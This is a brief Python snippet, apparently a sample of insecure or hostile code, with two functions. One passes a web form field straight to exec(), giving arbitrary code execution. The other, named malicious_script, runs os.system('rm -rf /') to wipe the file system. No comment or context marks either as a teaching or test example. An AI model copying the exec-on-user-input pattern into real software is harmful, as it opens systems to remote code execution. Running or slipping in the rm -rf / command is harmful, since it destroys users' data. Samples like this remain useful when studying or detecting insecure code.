def execute_user_code():
    user_code = request.form.get('user_code')
    exec(user_code)

def malicious_script():
    import os
    os.system('rm -rf /')